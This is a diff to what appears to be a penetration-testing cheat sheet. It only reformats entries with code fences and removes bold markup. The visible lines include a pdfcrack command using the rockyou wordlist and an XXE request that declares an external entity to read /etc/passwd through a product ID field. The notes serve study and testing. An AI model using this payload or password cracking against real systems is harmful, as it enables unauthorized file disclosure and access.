@@ -32,10 +32,14 @@ pdfcrack -f locked.pdf -w rockyou.txt
 ## XXE:
 ### Normal request:
 
+```
 <?xml version="1.0" encoding="UTF-8"?>
-<stockCheck><productId>381</productId></stockCheck> 
+<stockCheck><productId>381</productId></stockCheck>
+```
 
 ### Crafted request:
+```
 <?xml version="1.0" encoding="UTF-8"?>
-**<!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>**
+<!DOCTYPE toto [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>**&xxe;**</productId></stockCheck> 
+```
